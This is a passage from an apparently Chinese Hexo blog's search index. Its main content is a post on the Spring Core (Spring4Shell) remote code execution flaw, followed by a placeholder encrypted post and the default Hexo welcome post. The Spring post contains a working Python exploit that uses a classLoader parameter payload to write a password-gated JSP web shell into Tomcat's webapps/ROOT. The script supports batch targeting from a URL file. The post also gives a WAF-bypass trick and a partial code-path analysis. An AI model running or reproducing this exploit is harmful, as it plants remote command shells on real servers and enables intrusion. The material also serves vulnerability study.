function_">Exploit</span>(<span class="params">url</span>):</span><br><span class="line">    headers = &#123;<span class="string">&quot;suffix&quot;</span>:<span class="string">&quot;%&gt;//&quot;</span>,</span><br><span class="line">                <span class="string">&quot;c1&quot;</span>:<span class="string">&quot;Runtime&quot;</span>,</span><br><span class="line">                <span class="string">&quot;c2&quot;</span>:<span class="string">&quot;&lt;%&quot;</span>,</span><br><span class="line">                <span class="string">&quot;DNT&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    data = <span class="string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        go = requests.post(url,headers=headers,data=data,timeout=<span class="number">15</span>,allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>, proxies=&#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8888&#x27;</span>&#125;)</span><br><span class="line">        <span class="built_in">print</span>(go.status_code)</span><br><span class="line">        shellurl = urljoin(url, <span class="string">&#x27;tomcatwar.jsp&#x27;</span>)</span><br><span class="line">        shellgo = requests.get(shellurl,timeout=<span class="number">15</span>,allow_redirects=<span class="literal">False</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> shellgo.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;漏洞存在，shell地址为:<span class="subst">&#123;shellurl&#125;</span>?pwd=j&amp;cmd=whoami&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Srping-Core Rce.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;url file&#x27;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--url&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target url&#x27;</span>,required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        Exploit(args.url)</span><br><span class="line">    <span class="keyword">if</span> args.file:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (args.file) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">                i = i.strip()</span><br><span class="line">                Exploit(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406124230300.png" alt="image-20220406124230300"></p><h2 id="Waf绕过"><a href="#Waf绕过" class="headerlink" title="Waf绕过"></a>Waf绕过</h2><p><strong>当参数以 ! 开头则会将其剔除掉，也就是 !class.module 会得到 class.module</strong></p><p><img src="/2022/04/05/spring-shell/spring-shell/image-20220406125409295.png" alt="image-20220406125409295"></p><h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p><strong>由于spring-bean 的参数绑定机制，有get 以及 set 时，通过反射机制可以给其赋值，又由于对象绑定机制里缓存cache里会存在class bean 属性，通过getPropertyAccessorForPropertyPath方法 分割方法 依次循环 又由于jdk9+版本的特性在module里可以调用classloader,导致可以反射执行任意类的无参get方法</strong></p><p><strong>参数绑定的具体实现调用栈为</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">applyPropertyValues——&gt;setPropertyValues——&gt;setPropertyValue</span><br></pre></td></tr></table></figure><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223147913.png" alt="image-20220405223147913"></strong></p><p><strong>再 <code>setPropertyValues</code> 里调用函数 <code>setPropertyValue</code></strong> </p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223311152.png" alt="image-20220405223311152"></strong></p><p><strong><code>propertyName</code>会取pv的name值</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405223908400.png" alt="image-20220405223908400"></strong></p><p><strong>这里会通过<code>getPropertyAccessorForPropertyPath</code>-&gt;<code>getFirstNestedPropertySeparatorIndex</code>-&gt;<code>getNestedPropertySeparatorIndex</code>里的方法进行字符产分割判断 循环propertyPath 里的字符串，若存在则按“.”分割赋值给nestedProperty，pos为nestedProperty值的长度</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405225025804.png" alt="image-20220405225025804"></strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405224155780.png" alt="image-20220405224155780"></strong></p><p><strong>后面进入到 getNestedPropertyAccessor -&gt;getPropertyValue-&gt;getLocalPropertyHandler方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractNestablePropertyAccessor.<span class="type">PropertyTokenHolder</span> <span class="variable">tokens</span> <span class="operator">=</span> <span class="built_in">this</span>.getPropertyNameTokens(nestedProperty);</span><br></pre></td></tr></table></figure><p><strong>主要是获取tokens</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405225848328.png" alt="image-20220405225848328"></strong></p><p><strong>getCachedIntrospectionResults方法里会加载Bean class  并且返回给this.cachedIntrospectionResults</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405230612688.png" alt="image-20220405230612688"></strong></p><p><strong>在getPropertyDescriptor 方法里参数propertyName（即nestedProperty属性）是否在User的属性列表里，查看一下这个property列表，除了自动获取的User类的public方法和属性外，竟然还自带了一个class属性：</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405230940100.png" alt="image-20220405230940100"></strong></p><p><strong>最终通过readMethod.invoke 去进行反射执行set方法</strong></p><p><strong><img src="/2022/04/05/spring-shell/spring-shell/image-20220405234559412.png" alt="image-20220405234559412"></strong></p><p><strong>其实这个洞 我根本看不懂，云里雾里</strong> </p>]]></content>
      
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>demo</title>
      <link href="/2022/04/02/demo/demo/"/>
      <url>/2022/04/02/demo/demo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4fc00ec4f16e6aaf81b58ac3a63b42b279d4328204842d5086e3e63d7d9170e5">4630436162ade97ba2718b7d0c4b3b631ce3008cbd2d9c6a68213d361e81f8e1e14b9538fc1cae8a5bbf248499ea8b60f37acb621aad679d6a67aa4e4625d24de00ce6e7fc24db5760dd895eca8bef5094f68580d26b5b9e1a0f655f653bb586ad544920f56111e6bf8644f81c0fcc2af6d88a3c32b86d5e50729d04c335493ca52b5ab856be559cb2fef29381090e7dffbd7f515d50b59a1d5952d84e9d11ce5264cff938ff19a04fc817b4a15299a19334bfc8ec68bca2db4d33e88e5e074c3a95e29beecf9371cae8aa234605adb824d568db2c0efb5f77de93cb41e5785466c55094bcd359c8ba1770309e5fd20a4d3b8f032856c910051234f68b407771</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> demo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/04/02/hello-world/"/>
      <url>/2022/04/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
